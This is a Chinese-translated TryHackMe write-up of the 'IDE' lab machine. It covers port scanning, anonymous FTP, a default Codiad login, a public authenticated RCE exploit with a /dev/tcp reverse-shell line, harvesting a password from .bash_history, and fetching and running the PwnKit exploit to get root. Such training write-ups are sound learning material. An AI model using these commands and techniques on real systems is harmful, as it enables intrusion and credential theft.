<html>
<head>
<title>TryHackMe writeup: IDE</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">TryHackMe writeup: IDE</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/tryhackme-writeup-ide-4853122e4ec1?source=collection_archive---------0-----------------------#2022-03-30">https://infosecwriteups.com/tryhackme-writeup-ide-4853122e4ec1?source=collection_archive---------0-----------------------#2022-03-30</a></blockquote><div><div class="fc ii ij ik il im"/><div class="in io ip iq ir"><div class=""/><p id="0f43" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">TryHackMe发布了一个名为<em class="kp"> IDE </em>的房间，它将自己描述为“一个打磨你的枚举技能的简易盒子”(<a class="ae kq" href="https://tryhackme.com/room/ide" rel="noopener ugc nofollow" target="_blank">“blue storm”和“403Exploit”，2021 </a>)。这个房间确实考验了你的侦察和计数技能——要求学生探索每一个角落和缝隙，看看有什么可以公开访问或没有凭证。在这个房间里，我将描述在这个boot2root系统上获取必要标志的过程。</p><figure class="ks kt ku kv gu kw gi gj paragraph-image"><div role="button" tabindex="0" class="kx ky di kz bf la"><div class="gi gj kr"><img src="../Images/6395185ed6ffb7bd5f1dab18334b102c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*n1PnYOPn6hjnMxSuh3JIqA.png"/></div></div><figcaption class="ld le gk gi gj lf lg bd b be z dk translated">基础图片:<a class="ae kq" href="https://www.denofgeek.com/tv/how-veronica-mars-transcended-its-many-genres/" rel="noopener ugc nofollow" target="_blank">普里斯(2019) </a></figcaption></figure><h1 id="8813" class="lh li iu bd lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me bi translated">程序</h1><p id="73c0" class="pw-post-body-paragraph jr js iu jt b ju mf jw jx jy mg ka kb kc mh ke kf kg mi ki kj kk mj km kn ko in bi translated">首先，我必须为这个捕获标志建立两个目标:首先是获得一个具有用户级权限的<code class="fe mk ml mm mn b">user.txt</code>标志，然后获得一个具有根级权限的<code class="fe mk ml mm mn b">root.txt</code>标志。问题解决后，我现在可以开始执行我的攻击了。</p><h2 id="1104" class="mo li iu bd lj mp mq dn ln mr ms dp lr kc mt mu lv kg mv mw lz kk mx my md mz bi translated">初始探测</h2><p id="5685" class="pw-post-body-paragraph jr js iu jt b ju mf jw jx jy mg ka kb kc mh ke kf kg mi ki kj kk mj km kn ko in bi translated">和这些TryHackMe boot2root虚拟机一样，我点击了第一个任务右上角的绿色按钮“让球滚动起来”。我继续用带有以下标志的<code class="fe mk ml mm mn b">nmap</code>扫描来探测系统:</p><pre class="ks kt ku kv gu na mn nb nc aw nd bi"><span id="075a" class="mo li iu mn b gz ne nf l ng nh"><strong class="mn iv">└─</strong><strong class="mn iv">$ nmap -sT -v -Pn -p- -O -oX tcp_scan.xml &lt;boot2root ip&gt;</strong></span></pre><p id="1127" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated"><code class="fe mk ml mm mn b">nmap</code>扫描的结果显示了系统上一些有趣的端口(图1):端口21上的FTP服务、端口22上的SSH服务、端口80上的web服务器和端口62337上的神秘服务。</p><figure class="ks kt ku kv gu kw gi gj paragraph-image"><div role="button" tabindex="0" class="kx ky di kz bf la"><div class="gi gj ni"><img src="../Images/3bc4a4f89f64b47f189bba96637b39d3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*rjjsWc7MqTx0qEMqzhCqtQ.png"/></div></div><figcaption class="ld le gk gi gj lf lg bd b be z dk translated"><strong class="bd lj">图1: nmap结果。</strong></figcaption></figure><p id="1492" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated"><code class="fe mk ml mm mn b">nmap</code>还确定了可能运行Linux 3.1的操作系统。我最初探索的下一步是浏览web服务器。我用浏览器访问网站的主页，看到的是Apache2 web服务器的默认页面(图2)。</p><figure class="ks kt ku kv gu kw gi gj paragraph-image"><div role="button" tabindex="0" class="kx ky di kz bf la"><div class="gi gj nj"><img src="../Images/74abfa71bc91ec8c12a16399fdd2122a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*P8WQ6_pB81paxzdlLH7ddA.png"/></div></div><figcaption class="ld le gk gi gj lf lg bd b be z dk translated"><strong class="bd lj">图boot2root机器的默认页面。</strong></figcaption></figure><p id="c359" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">也许网络服务器有一个隐藏的目录？然后，我在我的攻击箱上的网络服务器上运行了<code class="fe mk ml mm mn b">gobuster</code> ( <a class="ae kq" href="https://github.com/OJ/gobuster" rel="noopener ugc nofollow" target="_blank"> Mehlmauer和“hytalo-bassi”，n.d. </a>):</p><pre class="ks kt ku kv gu na mn nb nc aw nd bi"><span id="8c8b" class="mo li iu mn b gz ne nf l ng nh"><strong class="mn iv">└─$ gobuster dir -u http://&lt;boot2root ip&gt;/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt </strong><br/>===============================================================<br/>Gobuster v3.1.0<br/>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br/>===============================================================<br/>[+] Url: http://&lt;boot2root ip&gt;/<br/>[+] Method: GET<br/>[+] Threads: 10<br/>[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt<br/>[+] Negative Status codes: 404<br/>[+] User Agent: gobuster/3.1.0<br/>[+] Timeout: 10s<br/>===================================================================<br/>[redacted] Starting gobuster in directory enumeration mode<br/>===================================================================</span></pre><p id="2734" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">当<code class="fe mk ml mm mn b">gobuster</code>在后台运行时，我将<code class="fe mk ml mm mn b">nmap</code>扫描的XML输出转换成可读的HTML格式(图1 ),然后以匿名用户的身份浏览FTP服务器:</p><pre class="ks kt ku kv gu na mn nb nc aw nd bi"><span id="2ea4" class="mo li iu mn b gz ne nf l ng nh"><strong class="mn iv">└─$ ftp &lt;boot2root ip&gt;</strong><br/>Connected to &lt;boot2root ip&gt;.<br/>220 (vsFTPd 3.0.3)<br/>Name (&lt;boot2root ip&gt;:[redacted]): <strong class="mn iv">anonymous</strong><br/>331 Please specify the password. <br/>Password: <strong class="mn iv">[no password]</strong><br/>230 Login successful.<br/>Remote system type is UNIX.<br/>Using binary mode to transfer files.<br/><strong class="mn iv">ftp&gt; ls</strong><br/>229 Entering Extended Passive Mode (|||59871|)<br/>150 Here comes the directory listing.<br/>226 Directory send OK.</span></pre><p id="0ccf" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">FTP服务器上似乎没有什么有趣的东西，所以我决定检查一下62337端口上的神秘服务。我用我的网络浏览器访问这个服务，得到如下结果(图3):</p><figure class="ks kt ku kv gu kw gi gj paragraph-image"><div role="button" tabindex="0" class="kx ky di kz bf la"><div class="gi gj nk"><img src="../Images/3385a2a5174ad4176058d1d84aab6acd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9Zju0-ogk5_3SoUbtswlHw.png"/></div></div><figcaption class="ld le gk gi gj lf lg bd b be z dk translated"><strong class="bd lj">图3:62337端口上的“神秘”服务。</strong></figcaption></figure><p id="a6c2" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">从<code class="fe mk ml mm mn b">&lt;title&gt;</code> HTML标签生成的标题判断，这个服务正在运行一个名为<a class="ae kq" href="http://codiad.com/" rel="noopener ugc nofollow" target="_blank"> Codiad (n.d.) </a>的软件，这是一个“基于web的IDE框架，占用空间小，要求最低。”基于web的IDE的特定版本是<code class="fe mk ml mm mn b">2.8.4</code>，使用<code class="fe mk ml mm mn b">searchsploit</code>搜索漏洞会发现以下远程命令执行漏洞:</p><pre class="ks kt ku kv gu na mn nb nc aw nd bi"><span id="0128" class="mo li iu mn b gz ne nf l ng nh"><strong class="mn iv">└─$ searchsploit codiad</strong></span><span id="70cf" class="mo li iu mn b gz nl nf l ng nh">[... snip ...]</span><span id="f46d" class="mo li iu mn b gz nl nf l ng nh">Codiad 2.8.4 — Remote Code Execution (Authenticated) | multiple/webapps/49705.py<br/> Codiad 2.8.4 — Remote Code Execution (Authenticated) (2) | multiple/webapps/49902.py<br/> Codiad 2.8.4 — Remote Code Execution (Authenticated) (3) | multiple/webapps/49907.py<br/> Codiad 2.8.4 — Remote Code Execution (Authenticated) (4) | multiple/webapps/50474.txt</span><span id="aeb2" class="mo li iu mn b gz nl nf l ng nh">[... snip ...]</span></pre><p id="13ad" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">不幸的是，这些攻击需要凭证。此外，<code class="fe mk ml mm mn b">gobuster</code>没有发现隐藏的目录(并只是吐出错误信息):</p><pre class="ks kt ku kv gu na mn nb nc aw nd bi"><span id="de0b" class="mo li iu mn b gz ne nf l ng nh">[ERROR] [redacted] [!] Get "http://&lt;boot2root ip&gt;/5585": context deadline exceeded (Client.Timeout exceeded while awaiting headers)<br/>[ERROR] [redacted] [!] Get "http://&lt;boot2root ip&gt;/000648": context deadline exceeded (Client.Timeout exceeded while awaiting headers)<br/>[ERROR] [redacted] [!] Get "http://&lt;boot2root ip&gt;/zihack": context deadline exceeded (Client.Timeout exceeded while awaiting headers)</span><span id="957d" class="mo li iu mn b gz nl nf l ng nh">/server-status (Status: 403) [Size: 275]<br/> <br/>===============================================================<br/>[redacted] Finished<br/>===============================================================</span></pre><p id="d608" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">然后，我将注意力转向FTP服务器(再次),更加努力地列举可以从系统中下载的任何内容:</p><pre class="ks kt ku kv gu na mn nb nc aw nd bi"><span id="7466" class="mo li iu mn b gz ne nf l ng nh"><strong class="mn iv">└─$ ftp &lt;boot2root ip&gt;</strong><br/>Connected to &lt;boot2root ip&gt;.<br/>220 (vsFTPd 3.0.3)<br/>Name (&lt;boot2root ip&gt;:[redacted]): <strong class="mn iv">anonymous</strong><br/>331 Please specify the password.<br/>Password: <strong class="mn iv">[no password]</strong><br/>230 Login successful.<br/>Remote system type is UNIX.<br/>Using binary mode to transfer files.<br/><strong class="mn iv">ftp&gt; ls -la</strong><br/>229 Entering Extended Passive Mode (|||42675|)<br/>150 Here comes the directory listing.<br/>drwxr-xr-x 3 0 114 4096 Jun 18 2021 .<br/>drwxr-xr-x 3 0 114 4096 Jun 18 2021 ..<br/>drwxr-xr-x 2 0 0 4096 Jun 18 2021 ...<br/>226 Directory send OK.<br/><strong class="mn iv">ftp&gt; cd ...</strong><br/>250 Directory successfully changed.<br/><strong class="mn iv">ftp&gt; ls -la</strong><br/>229 Entering Extended Passive Mode (|||49004|)<br/>150 Here comes the directory listing.<br/>-rw-r-r-- 1 0 0 151 Jun 18 2021 -<br/>drwxr-xr-x 2 0 0 4096 Jun 18 2021 .<br/>drwxr-xr-x 3 0 114 4096 Jun 18 2021 ..<br/>226 Directory send OK.<br/><strong class="mn iv">ftp&gt; get "-"</strong><br/>[... snip ...]<br/>226 Transfer complete.<br/>151 bytes received in [redacted]<br/><strong class="mn iv">ftp&gt;</strong></span></pre><p id="8991" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">在根目录下运行<code class="fe mk ml mm mn b">ls -la</code>显示了一个名为“…”的目录，然后我将其更改为，然后再次运行<code class="fe mk ml mm mn b">ls -la</code>命令。运行它发现系统上有一个名为“-”的文件，然后我将它下载到我的攻击箱中。以下内容在“-”文件中:</p><pre class="ks kt ku kv gu na mn nb nc aw nd bi"><span id="790f" class="mo li iu mn b gz ne nf l ng nh">Hey john,<br/>I have reset the password as you have asked. Please use the default password to login. <br/>Also, please take care of the image file ;)<br/>- drac.</span></pre><p id="b8fc" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我在这里了解到三个重要的事实:系统上有一个名为<code class="fe mk ml mm mn b">john</code>的用户，系统上有另一个名为<code class="fe mk ml mm mn b">drac</code>的用户，并且某种服务正在使用“默认密码”。</p><p id="cfb7" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">根据房间的名称，我推测这个默认密码在运行于62337端口的Codio web应用程序上。我尝试了许多默认密码，得出登录应用程序的密码组合是<code class="fe mk ml mm mn b">john:password</code>，并且能够登录应用程序(图4):</p><figure class="ks kt ku kv gu kw gi gj paragraph-image"><div role="button" tabindex="0" class="kx ky di kz bf la"><div class="gi gj nm"><img src="../Images/a375e8a7484271f608b0e4e300b40f5c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*pWCxZlH3yKWV4JY0RSqo8g.png"/></div></div><figcaption class="ld le gk gi gj lf lg bd b be z dk translated"><strong class="bd lj">图Codiad应用程序</strong></figcaption></figure><p id="6f08" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我简单地看了一下这个项目，从文件名和粗略阅读的代码中猜测，这似乎是某种视频流应用程序。但是现在我有进入Codiad帐户的有效凭证，我可以继续利用。</p><h2 id="d915" class="mo li iu bd lj mp mq dn ln mr ms dp lr kc mt mu lv kg mv mw lz kk mx my md mz bi translated">剥削</h2><p id="3836" class="pw-post-body-paragraph jr js iu jt b ju mf jw jx jy mg ka kb kc mh ke kf kg mi ki kj kk mj km kn ko in bi translated">有了有效的Codiad登录，我现在可以继续配置Codiad漏洞并将其武器化。我决定使用由<code class="fe mk ml mm mn b">searchsploit</code>提供的<code class="fe mk ml mm mn b">49705.py</code>概念验证——首先打开一个netcat监听器，然后启动漏洞利用:</p><pre class="ks kt ku kv gu na mn nb nc aw nd bi"><span id="7f07" class="mo li iu mn b gz ne nf l ng nh"><strong class="mn iv">└─$ python3 49705.py http://&lt;boot2root ip&gt;:62337/ john password &lt;attackbox ip&gt; 4445</strong><br/>[+] Please execute the following command on your vps: <br/>echo 'bash -c "bash -i &gt;/dev/tcp/&lt;boot2root ip&gt;/4445 0&gt;&amp;1 2&gt;&amp;1"' | </span><span id="b68d" class="mo li iu mn b gz nl nf l ng nh">[... snip ...]</span><span id="ad0a" class="mo li iu mn b gz nl nf l ng nh">[+] Please confirm that you have done the two command above [y/n]<br/>[Y/n] <strong class="mn iv">Y</strong><br/>[+] Starting...<br/>[+] Login Content : {"status":"success","data":{"username":"john"}}<br/>[+] Login success!<br/>[+] Getting writeable path…<br/>[+] Path Content : {"status":"success","data":{"name":"CloudCall","path":"\/var\/www\/html\/codiad_projects"}}<br/>[+] Writeable Path : /var/www/html/codiad_projects<br/>[+] Sending payload...</span></pre><p id="e8c2" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">在利用漏洞之后，我在目标系统上安装了一个shell:</p><pre class="ks kt ku kv gu na mn nb nc aw nd bi"><span id="6698" class="mo li iu mn b gz ne nf l ng nh">connect to [&lt;attackbox ip&gt;] from (UNKNOWN) [&lt;boot2root ip&gt;] 52940<br/>bash: cannot set terminal process group (921): Inappropriate ioctl for device<br/>bash: no job control in this shell<br/><strong class="mn iv">www-data@ide:/var/www/html/codiad/components/filemanager$ id</strong><br/>id<br/>uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></pre><h2 id="3568" class="mo li iu bd lj mp mq dn ln mr ms dp lr kc mt mu lv kg mv mw lz kk mx my md mz bi translated">后剥削</h2><p id="9485" class="pw-post-body-paragraph jr js iu jt b ju mf jw jx jy mg ka kb kc mh ke kf kg mi ki kj kk mj km kn ko in bi translated">使用一个shell，我试图获得<code class="fe mk ml mm mn b">user.txt</code>标志——但遗憾的是，因为我没有所需的读取权限，所以无法获得:</p><pre class="ks kt ku kv gu na mn nb nc aw nd bi"><span id="43b1" class="mo li iu mn b gz ne nf l ng nh"><strong class="mn iv">www-data@ide:/var/www/html/codiad/components/filemanager$ find / -name user.txt -type f -print 2&gt;/dev/null</strong><br/>&lt;r$ find / -name user.txt -type f -print 2&gt;/dev/null <br/>/home/drac/user.txt<br/><strong class="mn iv">www-data@ide:/var/www/html/codiad/components/filemanager$ cat /home/drac/user.txt</strong><br/>&lt;iad/components/filemanager$ cat /home/drac/user.txt <br/>cat: /home/drac/user.txt: Permission denied</span></pre><p id="c186" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">因此，我得到了一个目录列表，其中列出了我可以从使用<code class="fe mk ml mm mn b">ls -la</code>的<code class="fe mk ml mm mn b">drac</code>用户帐户中读取的文件类型</p><pre class="ks kt ku kv gu na mn nb nc aw nd bi"><span id="b202" class="mo li iu mn b gz ne nf l ng nh">total 52<br/> drwxr-xr-x 6 drac drac 4096 Aug 4 2021 .<br/> drwxr-xr-x 3 root root 4096 Jun 17 2021 ..<br/> -rw------- 1 drac drac 49 Jun 18 2021 .Xauthority<br/> -rw-r--r-- 1 drac drac 36 Jul 11 2021 .bash_history<br/> -rw-r--r-- 1 drac drac 220 Apr 4 2018 .bash_logout<br/> -rw-r--r-- 1 drac drac 3787 Jul 11 2021 .bashrc<br/> drwx------ 4 drac drac 4096 Jun 18 2021 .cache<br/> drwxr-x--- 3 drac drac 4096 Jun 18 2021 .config<br/> drwx------ 4 drac drac 4096 Jun 18 2021 .gnupg<br/> drwx------ 3 drac drac 4096 Jun 18 2021 .local<br/> -rw-r--r-- 1 drac drac 807 Apr 4 2018 .profile<br/> -rw-r--r-- 1 drac drac 0 Jun 17 2021 .sudo_as_admin_successful<br/> -rw------- 1 drac drac 557 Jun 18 2021 .xsession-errors<br/> -r-------- 1 drac drac 33 Jun 18 2021 user.txt</span></pre><p id="4ca2" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">有了<code class="fe mk ml mm mn b">www-data</code>账号，我可以读取四个文件:<code class="fe mk ml mm mn b">.bash_history</code>、<code class="fe mk ml mm mn b">.bash_logout</code>、<code class="fe mk ml mm mn b">.bashrc</code>、<code class="fe mk ml mm mn b">.profile</code>和<code class="fe mk ml mm mn b">.sudo_as_admin_successful</code>。然后，我使用Python建立一个微型HTTP服务，将可读文件传输到我的攻击箱中，然后用<code class="fe mk ml mm mn b">cat</code>检查它们的内容。<code class="fe mk ml mm mn b">.bash_history</code>有一条重要的信息:</p><pre class="ks kt ku kv gu na mn nb nc aw nd bi"><span id="3ba8" class="mo li iu mn b gz ne nf l ng nh">mysql -u drac -p 'Th3dRaCULa1sR3aL'</span></pre><p id="32c7" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">似乎<code class="fe mk ml mm mn b">drac</code>用户正在连接到某个MySQL实例，并且正在重用他们的用户名。他们也可能重复使用他们的密码，所以我决定使用MySQL密码通过SSH登录到<code class="fe mk ml mm mn b">drac</code>账户，然后…</p><pre class="ks kt ku kv gu na mn nb nc aw nd bi"><span id="267a" class="mo li iu mn b gz ne nf l ng nh"><strong class="mn iv">└─$ ssh drac@&lt;boot2root ip&gt; </strong><br/>The authenticity of host '&lt;boot2root ip&gt; (&lt;boot2root ip&gt;)' can’t be established.<br/>ED25519 key fingerprint is SHA256:74/tt/begRRzOOEOmVr2W3VX96tjC2aHyfqOEFUOkRk.<br/>This key is not known by any other names<br/>Are you sure you want to continue connecting (yes/no/[fingerprint])? <strong class="mn iv">yes</strong><br/>Warning: Permanently added '&lt;boot2root ip&gt;' (ED25519) to the list of known hosts.<br/>drac@&lt;boot2root ip&gt;’s password: <strong class="mn iv">[Th3dRaCULa1sR3aL]</strong><br/>Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0–147-generic x86_64)</span><span id="7dae" class="mo li iu mn b gz nl nf l ng nh">* Documentation: https://help.ubuntu.com<br/> * Management: https://landscape.canonical.com<br/> * Support: https://ubuntu.com/advantage</span><span id="4cc1" class="mo li iu mn b gz nl nf l ng nh">System information as of [redacted]</span><span id="4566" class="mo li iu mn b gz nl nf l ng nh">System load: 0.08 Processes: 101<br/> Usage of /: 49.9% of 8.79GB Users logged in: 0<br/> Memory usage: 16% IP address for eth0: &lt;boot2root ip&gt;<br/> Swap usage: 0%</span><span id="b1ad" class="mo li iu mn b gz nl nf l ng nh">* Canonical Livepatch is available for installation.<br/> — Reduce system reboots and improve kernel security. Activate at:<br/> https://ubuntu.com/livepatch</span><span id="73a0" class="mo li iu mn b gz nl nf l ng nh">69 packages can be updated.<br/>1 update is a security update.</span><span id="fbca" class="mo li iu mn b gz nl nf l ng nh">Last login: [redacted]<br/><strong class="mn iv">drac@ide:~$</strong></span></pre><p id="1192" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">使用与<code class="fe mk ml mm mn b">drac</code>相同的文件权限，我现在可以读取<code class="fe mk ml mm mn b">user.txt</code>文件:</p><pre class="ks kt ku kv gu na mn nb nc aw nd bi"><span id="9e4c" class="mo li iu mn b gz ne nf l ng nh"><strong class="mn iv">drac@ide:~$ cat user.txt<br/></strong>[redacted]</span></pre><p id="4195" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">下一步是获取<code class="fe mk ml mm mn b">root.txt</code>标志，这可以通过利用boot2root系统中的权限提升错误来实现。我首先将<em class="kp"> Linux智能枚举脚本</em> ( <a class="ae kq" href="https://github.com/diego-treitos/linux-smart-enumeration" rel="noopener ugc nofollow" target="_blank"> Blanco，n.d. </a>)下载到boot2root系统上，然后运行它来寻找根系统的潜在候选对象。</p><pre class="ks kt ku kv gu na mn nb nc aw nd bi"><span id="02e0" class="mo li iu mn b gz ne nf l ng nh"><strong class="mn iv">drac@ide:~$ ./lse.sh</strong><br/>-----<br/>If you know the current user password, write it here to check sudo privileges: <strong class="mn iv">Th3dRaCULa1sR3aL</strong> <br/>-----<br/> <br/> LSE Version: 4.2nw</span><span id="47bb" class="mo li iu mn b gz nl nf l ng nh">User: drac<br/> User ID: 1000<br/> Password: ******<br/> Home: /home/drac<br/> Path: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin<br/> umask: 0002</span><span id="7616" class="mo li iu mn b gz nl nf l ng nh">Hostname: ide<br/> Linux: 4.15.0–147-generic<br/>Distribution: Ubuntu 18.04.5 LTS<br/>Architecture: x86_64</span><span id="a4f0" class="mo li iu mn b gz nl nf l ng nh">======================( humanity )=========================<br/>[!] nowar0 Should we question autocrats and their "military operations"?... yes!</span><span id="fa5b" class="mo li iu mn b gz nl nf l ng nh">[... snip ...]</span><span id="0efe" class="mo li iu mn b gz nl nf l ng nh">[!] cve-2021-3560 Checking for policykit vulnerability..................... nope<br/>[!] cve-2021-4034 Checking for PwnKit <strong class="mn iv"># Interesting Exploit</strong> vulnerability........................ yes!<br/>---<br/>Vulnerable!<br/>---<br/>[!] cve-2022-0847 Dirty Pipe <strong class="mn iv"># Interesting Exploit</strong> vulnerability................................. yes!<br/>---<br/>4.15.0-147-generic<br/>---</span><span id="f75d" class="mo li iu mn b gz nl nf l ng nh">[... snip ...]</span><span id="3660" class="mo li iu mn b gz nl nf l ng nh"><strong class="mn iv">drac@ide:~$</strong></span></pre><p id="c5c9" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">在未能通过肮脏管道漏洞(<a class="ae kq" href="https://dirtypipe.cm4all.com/" rel="noopener ugc nofollow" target="_blank">凯勒曼，2022 </a>)对系统进行根攻击后，我决定利用PwnKit漏洞以及<a class="ae kq" href="https://github.com/ly4k/PwnKit" rel="noopener ugc nofollow" target="_blank"> Lyak(未注明)</a>设计的编译和工作漏洞，自动将自己置于根外壳上:</p><pre class="ks kt ku kv gu na mn nb nc aw nd bi"><span id="4c89" class="mo li iu mn b gz ne nf l ng nh"><strong class="mn iv">drac@ide:~$ wget http://&lt;attackbox ip&gt;:8888/exploits/PwnKit</strong><br/>-- [redacted] --  http://&lt;attackbox ip&gt;:8888/exploits/PwnKit<br/>Connecting to &lt;attackbox ip&gt;:8888... connected.<br/>HTTP request sent, awaiting response... 200 OK<br/>Length: 14688 (14K) [application/octet-stream]<br/>Saving to: 'PwnKit'</span><span id="872c" class="mo li iu mn b gz nl nf l ng nh">PwnKit 100%[============================================================&gt;] [redacted] in 0.1s</span><span id="6743" class="mo li iu mn b gz nl nf l ng nh">[redacted] (131 KB/s) — 'PwnKit' saved [14688/14688]</span><span id="8cf9" class="mo li iu mn b gz nl nf l ng nh"><strong class="mn iv">drac@ide:~$ ls -l PwnKit</strong><br/>-rw-rw-r-- 1 drac drac 14688 [redacted] PwnKit<br/><strong class="mn iv">drac@ide:~$ chmod +x PwnKit</strong><br/><strong class="mn iv">drac@ide:~$ ./PwnKit</strong><br/>To run a command as administrator (user "root"), use "sudo &lt;command&gt;".<br/>See "man sudo_root" for details.</span><span id="47ba" class="mo li iu mn b gz nl nf l ng nh"><strong class="mn iv">root@ide:/home/drac#</strong></span></pre><p id="633d" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">剩下的就是转储<code class="fe mk ml mm mn b">root.txt</code>文件:</p><pre class="ks kt ku kv gu na mn nb nc aw nd bi"><span id="f15b" class="mo li iu mn b gz ne nf l ng nh"><strong class="mn iv">root@ide:/home/drac# cat /root/root.txt<br/></strong>[redacted]</span></pre><p id="f544" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">阿洛拉。</p><h1 id="143d" class="lh li iu bd lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me bi translated">结论</h1><p id="ce66" class="pw-post-body-paragraph jr js iu jt b ju mf jw jx jy mg ka kb kc mh ke kf kg mi ki kj kk mj km kn ko in bi translated">IDE房间非常有趣！就执行攻击所需的技术技能而言，这相当容易，但它迫使学生真正练习他们的枚举和探测技能。这表明，对目标系统的广泛探测可能会导致某种类型的漏洞——因为即使是最优秀的系统管理员也会犯错，从而导致坏人获得访问权限。</p><h2 id="d756" class="mo li iu bd lj mp mq dn ln mr ms dp lr kc mt mu lv kg mv mw lz kk mx my md mz bi translated">外卖食品</h2><ul class=""><li id="59c4" class="nn no iu jt b ju mf jy mg kc np kg nq kk nr ko ns nt nu nv bi translated">执行专业渗透测试时，请确保扫描目标系统上的所有端口。这可以通过在<code class="fe mk ml mm mn b">nmap</code>上添加<code class="fe mk ml mm mn b">-p-</code>标志来实现。</li><li id="5dfe" class="nn no iu jt b ju nw jy nx kc ny kg nz kk oa ko ns nt nu nv bi translated">此外，如果一个人可以匿名读取FTP服务器，一定要用<code class="fe mk ml mm mn b">ls -la</code>命令枚举所有目录，因为看似无用的文件可能是“进入王国的钥匙”</li><li id="af63" class="nn no iu jt b ju nw jy nx kc ny kg nz kk oa ko ns nt nu nv bi translated">端口80上的web服务器可能不容易被利用，或者可能只有一个默认网页。</li><li id="58b0" class="nn no iu jt b ju nw jy nx kc ny kg nz kk oa ko ns nt nu nv bi translated">确保在远程目标系统上读取或下载任何具有读取权限的文件。<code class="fe mk ml mm mn b">.bash_history</code>文件为我提供了一个密码，我可以在通过SSH服务登录到<code class="fe mk ml mm mn b">drac</code>帐户时重用这个密码。</li><li id="38e4" class="nn no iu jt b ju nw jy nx kc ny kg nz kk oa ko ns nt nu nv bi translated">如果一个权限提升利用由于某种原因失败了，您总是可以尝试另一个；-)</li></ul><h2 id="935e" class="mo li iu bd lj mp mq dn ln mr ms dp lr kc mt mu lv kg mv mw lz kk mx my md mz bi translated">插头</h2><p id="7034" class="pw-post-body-paragraph jr js iu jt b ju mf jw jx jy mg ka kb kc mh ke kf kg mi ki kj kk mj km kn ko in bi translated">看看我的朋友米拉·拉辛，她和其他同事一样，需要经济和情感上的帮助。请查看以下链接:</p><ul class=""><li id="625b" class="nn no iu jt b ju jv jy jz kc ob kg oc kk od ko ns nt nu nv bi translated">她的推特简介:【https://twitter.com/MiraLazine T2】</li><li id="7f43" class="nn no iu jt b ju nw jy nx kc ny kg nz kk oa ko ns nt nu nv bi translated">她的中档:【https://medium.com/@MiraLazine】T4</li><li id="cdb2" class="nn no iu jt b ju nw jy nx kc ny kg nz kk oa ko ns nt nu nv bi translated">用现金捐给她自己。app:<a class="ae kq" href="https://cash.app/$MiraLazine" rel="noopener ugc nofollow" target="_blank">https://cash.app/$MiraLazine</a></li></ul><h1 id="507d" class="lh li iu bd lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me bi translated">参考</h1><p id="a11c" class="pw-post-body-paragraph jr js iu jt b ju mf jw jx jy mg ka kb kc mh ke kf kg mi ki kj kk mj km kn ko in bi translated">布兰科博士。<em class="kp"> Linux智能枚举</em>。GitHub仓库。2022年3月28日检索自:<a 